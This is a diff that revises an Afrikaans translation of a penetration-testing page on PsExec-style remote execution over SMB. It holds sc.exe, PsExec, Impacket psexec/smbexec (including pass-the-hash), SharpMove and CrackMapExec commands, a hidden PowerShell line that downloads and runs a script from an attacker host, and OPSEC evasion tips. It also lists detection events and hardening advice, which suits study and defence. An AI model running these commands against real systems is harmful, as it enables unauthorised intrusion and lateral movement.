@@ -4,23 +4,23 @@
 
 ## Hoe werk hulle
 
-Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op 'n teikenhost uit te voer. Die algemene vloei is:
+Hierdie tegnieke misbruik die Windows Service Control Manager (SCM) op afstand oor SMB/RPC om opdragte op ’n teikenstelsel uit te voer. Die algemene vloei is:
 
-1. Verifieer by die teiken en toegang tot die ADMIN$ deel oor SMB (TCP/445).
-2. Kopieer 'n uitvoerbare lêer of spesifiseer 'n LOLBAS-opdraglyn wat die diens sal uitvoer.
-3. Skep 'n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre wys.
-4. Begin die diens om die payload uit te voer en opsioneel stdin/stdout via 'n benoemde pyp te vang.
-5. Stop die diens en maak skoon (verwyder die diens en enige gelaat binêre).
+1. Verifieer by die teiken en kry toegang tot die ADMIN$ share oor SMB (TCP/445).
+2. Kopieer ’n uitvoerbare lêer, of spesifiseer ’n LOLBAS-opdragreël wat die diens sal uitvoer.
+3. Skep ’n diens op afstand via SCM (MS-SCMR oor \PIPE\svcctl) wat na daardie opdrag of binêre lêer wys.
+4. Begin die diens om die payload uit te voer en vang opsioneel stdin/stdout via ’n named pipe vas.
+5. Stop die diens en ruim op (verwyder die diens en enige afgelaaide binêre lêers).
 
 Vereistes/voorvereistes:
-- Plaaslike Administrateur op die teiken (SeCreateServicePrivilege) of eksplisiete diens skeppingsregte op die teiken.
-- SMB (445) bereikbaar en ADMIN$ deel beskikbaar; Afstandsdiensbestuur toegelaat deur die gasvuurmuur.
-- UAC Afstandsbeperkings: met plaaslike rekeninge kan tokenfiltrering admin oor die netwerk blokkeer tensy die ingeboude Administrateur of LocalAccountTokenFilterPolicy=1 gebruik word.
-- Kerberos teen NTLM: die gebruik van 'n hostname/FQDN stel Kerberos in staat; verbinding deur IP val dikwels terug na NTLM (en kan geblokkeer word in geharde omgewings).
+- Local Administrator op die teiken (SeCreateServicePrivilege), of eksplisiete regte om dienste op die teiken te skep.
+- SMB (445) moet bereikbaar wees en die ADMIN$ share moet beskikbaar wees; Remote Service Management moet deur die host se firewall toegelaat word.
+- UAC Remote Restrictions: met plaaslike rekeninge kan token filtering admin-toegang oor die netwerk blokkeer, tensy die ingeboude Administrator gebruik word of LocalAccountTokenFilterPolicy=1 gestel is.
+- Kerberos teenoor NTLM: die gebruik van ’n hostname/FQDN maak Kerberos moontlik; verbinding deur IP val dikwels terug na NTLM (en kan in geharde omgewings geblokkeer word).
 
 ### Handmatige ScExec/WinExec via sc.exe
 
-Die volgende toon 'n minimale diens-skepping benadering. Die diensbeeld kan 'n gelaat EXE of 'n LOLBAS soos cmd.exe of powershell.exe wees.
+Die volgende toon ’n minimale benadering vir die skep van ’n diens. Die diens se image kan ’n afgelaaide EXE wees, of ’n LOLBAS soos cmd.exe of powershell.exe.
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -34,17 +34,17 @@ sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
 Notas:
-- Verwacht 'n tydsduur fout wanneer 'n nie-diens EXE begin; uitvoering gebeur steeds.
-- Om meer OPSEC-vriendelik te bly, verkies fileless opdragte (cmd /c, powershell -enc) of verwyder gelaaide artefakte.
+- Verwag ’n timeout-fout wanneer ’n nie-service EXE begin word; uitvoering vind steeds plaas.
+- Om meer OPSEC-vriendelik te bly, verkies fileless commands (cmd /c, powershell -enc) of verwyder dropped artifacts.
 
-Vind meer gedetailleerde stappe in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
+Vind meer gedetailleerde stappe by: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
-## Gereedskap en voorbeelde
+## Tooling en voorbeelde
 
 ### Sysinternals PsExec.exe
 
-- Klassieke administratiewe hulpmiddel wat SMB gebruik om PSEXESVC.exe in ADMIN$ te plaas, installeer 'n tydelike diens (standaardnaam PSEXESVC), en proxy I/O oor benoemde pype.
-- Voorbeeld gebruike:
+- Klassieke administrateurshulpmiddel wat SMB gebruik om PSEXESVC.exe in ADMIN$ te drop, ’n tydelike service (versteknaam PSEXESVC) te installeer en I/O oor named pipes te proxy.
+- Voorbeeldgebruike:<sup>[[1]](#references)</sup>
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +55,16 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- U kan direk vanaf Sysinternals Live via WebDAV begin:
+- Jy kan direk vanaf Sysinternals Live via WebDAV begin:
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
 OPSEC
-- Laat diensinstallasie/ontinstallasie gebeurtenisse agter (diensnaam dikwels PSEXESVC tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.
+- Laat diensinstallasie-/deïnstallasiegebeurtenisse agter (diensnaam is dikwels PSEXESVC tensy -r gebruik word) en skep C:\Windows\PSEXESVC.exe tydens uitvoering.
 
 ### Impacket psexec.py (PsExec-agtig)
 
-- Gebruik 'n ingebedde RemCom-agtige diens. Laat 'n tydelike diens-binary val (gewoonlik gerandomiseerde naam) via ADMIN$, skep 'n diens (standaard dikwels RemComSvc), en proxy I/O oor 'n benoemde pyp.
+- Gebruik ’n ingebedde RemCom-agtige diens. Plaas ’n tydelike diensbinêr (gewoonlik met ’n ewekansige naam) via ADMIN$, skep ’n diens (standaard dikwels RemComSvc), en proxieer I/O oor ’n named pipe.
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -79,77 +79,74 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 Artefakte
-- Tydelike EXE in C:\Windows\ (ewekans 8 karakters). Diensnaam is standaard RemComSvc tensy oorgeskryf.
+- Tydelike EXE in C:\Windows\ (8 willekeurige karakters). Diensnaam is standaard RemComSvc, tensy dit oorskryf word.
 
 ### Impacket smbexec.py (SMBExec)
 
-- Skep 'n tydelike diens wat cmd.exe laat ontstaan en gebruik 'n benoemde pyp vir I/O. Vermy oor die algemeen om 'n volle EXE-lading te laat val; opdraguitvoering is semi-interaktief.
+- Skep ’n tydelike diens wat cmd.exe voortbring en ’n named pipe vir I/O gebruik. Vermy gewoonlik die aflaai van ’n volledige EXE payload; beveluitvoering is semi-interaktief.
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
-### SharpLateral en SharpMove
+### SharpLateral and SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie laterale bewegingsmetodes, insluitend diens-gebaseerde exec.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementeer verskeie lateral movement-metodes, insluitend service-based exec.
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- [SharpMove](https://github.com/0xthirteen/SharpMove) sluit dienswysiging/creasie in om 'n opdrag op afstand uit te voer.
+- [SharpMove](https://github.com/0xthirteen/SharpMove) sluit dienswysiging/-skepping in om 'n opdrag op afstand uit te voer.
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-- Jy kan ook CrackMapExec gebruik om via verskillende agtergronde (psexec/smbexec/wmiexec) uit te voer:
+- Jy kan ook CrackMapExec gebruik om via verskillende backends uit te voer (psexec/smbexec/wmiexec):
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
 ## OPSEC, opsporing en artefakte
 
-Tipiese gasheer/netwerk artefakte wanneer PsExec-agtige tegnieke gebruik word:
-- Sekuriteit 4624 (Aanmeldtipe 3) en 4672 (Spesiale Privileges) op teiken vir die admin rekening wat gebruik is.
-- Sekuriteit 5140/5145 Lêer Deel en Lêer Deel Gedetailleerde gebeurtenisse wat ADMIN$ toegang en skep/skryf van diens binêre (bv. PSEXESVC.exe of ewekansige 8-karakter .exe) toon.
-- Sekuriteit 7045 Diens Install op teiken: diens name soos PSEXESVC, RemComSvc, of pasgemaak (-r / -service-name).
-- Sysmon 1 (Proses Skep) vir services.exe of die diens beeld, 3 (Netwerk Verbinding), 11 (Lêer Skep) in C:\Windows\, 17/18 (Pyp Gemaak/Verbonden) vir pype soos \\.\pipe\psexesvc, \\.\pipe\remcom_*, of ewekansige ekwivalente.
-- Registrasie artefak vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operateur gasheer (indien nie onderdruk nie).
+Tipiese host-/netwerkartefakte wanneer PsExec-like techniques gebruik word:
+- Security 4624 (Logon Type 3) en 4672 (Special Privileges) op die teiken vir die admin account wat gebruik is.
+- Security 5140/5145 File Share en File Share Detailed events wat ADMIN$-toegang en die skep/skryf van service binaries toon (bv. PSEXESVC.exe of ’n ewekansige 8-karakter .exe).
+- Security 7045 Service Install op die teiken: service name soos PSEXESVC, RemComSvc, of custom (-r / -service-name).
+- Sysmon 1 (Process Create) vir services.exe of die service image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) vir pipes soos \\.\pipe\psexesvc, \\.\pipe\remcom_*, of gerandomiseerde ekwivalente.
+- Registry artifact vir Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 op die operator host (indien dit nie onderdruk is nie).
 
-Jag idees
-- Alarmering op diens installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP plekke insluit.
-- Soek na proses skep waar ParentImage C:\Windows\PSEXESVC.exe of kinders van services.exe wat as LOCAL SYSTEM shells uitvoer.
-- Merk naam pype wat eindig op -stdin/-stdout/-stderr of bekende PsExec kloon pyp name.
+Hunting-idees
+- Genereer ’n alert vir service installs waar die ImagePath cmd.exe /c, powershell.exe, of TEMP-liggings insluit.
+- Soek process creations waar ParentImage C:\Windows\PSEXESVC.exe is, of waar children van services.exe as LOCAL SYSTEM loop en shells uitvoer.
+- Merk named pipes wat op -stdin/-stdout/-stderr eindig, of bekende PsExec clone-pipe names.
 
-## Probleemoplossing algemene mislukkings
-- Toegang is geweier (5) wanneer dienste geskep word: nie werklik plaaslike admin nie, UAC afstand beperkings vir plaaslike rekeninge, of EDR tampering beskerming op die diens binêre pad.
-- Die netwerk pad is nie gevind nie (53) of kon nie met ADMIN$ verbind nie: firewall blokkeer SMB/RPC of admin deel is gedeaktiveer.
-- Kerberos misluk maar NTLM is geblokkeer: verbind met hostname/FQDN (nie IP nie), verseker behoorlike SPNs, of verskaf -k/-no-pass met kaartjies wanneer Impacket gebruik word.
-- Diens begin tydens uit maar payload het gedra: verwag as dit nie 'n werklike diens binêre is nie; vang uitvoer in 'n lêer of gebruik smbexec vir lewendige I/O.
+## Foutoplossing van algemene mislukkings
+- Access is denied (5) tydens die skep van services: nie werklik local admin nie, UAC remote restrictions vir local accounts, of EDR tampering protection op die service binary path.
+- The network path was not found (53) of kon nie aan ADMIN$ koppel nie: firewall blokkeer SMB/RPC, of admin shares is gedeaktiveer.
+- Kerberos misluk maar NTLM is geblokkeer: koppel met hostname/FQDN (nie IP nie), verseker korrekte SPNs, of verskaf -k/-no-pass met tickets wanneer Impacket gebruik word.
+- Service start times out maar die payload het geloop: verwag indien dit nie ’n werklike service binary is nie; capture output na ’n lêer, of gebruik smbexec vir live I/O.
 
-## Versterking notas
-- Windows 11 24H2 en Windows Server 2025 vereis SMB ondertekening standaard vir uitgaande (en Windows 11 inkomende) verbindings. Dit breek nie legitieme PsExec gebruik met geldige krediete nie, maar voorkom ongetekende SMB relay misbruik en kan toestelle beïnvloed wat nie ondertekening ondersteun nie.
-- Nuwe SMB kliënt NTLM blokkering (Windows 11 24H2/Server 2025) kan NTLM terugval voorkom wanneer verbind met IP of na nie-Kerberos bedieners. In versterkte omgewings sal dit NTLM-gebaseerde PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of stel uitsonderings in indien legitiem nodig.
-- Beginsels van minste voorreg: minimaliseer plaaslike admin lidmaatskap, verkies Just-in-Time/Just-Enough Admin, handhaaf LAPS, en monitor/alarm op 7045 diens installs.
+## Hardening-notas
+- Windows 11 24H2 en Windows Server 2025 vereis SMB signing by verstek vir outbound (en Windows 11 inbound) connections. Dit breek nie legitieme PsExec-gebruik met geldige creds nie, maar voorkom unsigned SMB relay abuse en kan toestelle beïnvloed wat nie signing ondersteun nie.<sup>[[2]](#references)</sup>
+- Nuwe SMB client NTLM blocking (Windows 11 24H2/Server 2025) kan NTLM fallback voorkom wanneer daar volgens IP of na non-Kerberos servers gekoppel word. In hardened environments sal dit NTLM-based PsExec/SMBExec breek; gebruik Kerberos (hostname/FQDN) of configure exceptions indien dit legitiem nodig is.<sup>[[2]](#references)</sup>
+- Principle of least privilege: minimaliseer local admin membership, verkies Just-in-Time/Just-Enough Admin, enforce LAPS, en monitor/genereer alerts vir 7045 service installs.
 
 ## Sien ook
 
-- WMI-gebaseerde afstand exec (dikwels meer lêervry):
-
+- WMI-based remote exec (dikwels meer fileless):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM-gebaseerde afstand exec:
-
+- WinRM-based remote exec:
 
 {{#ref}}
 ./winrm.md
 {{#endref}}
 
-
-
 ## Verwysings
 
-- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
-- SMB sekuriteit versterking in Windows Server 2025 & Windows 11 (ondertekening standaard, NTLM blokkering): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
+- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
+- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 {{#include ../../banners/hacktricks-training.md}}
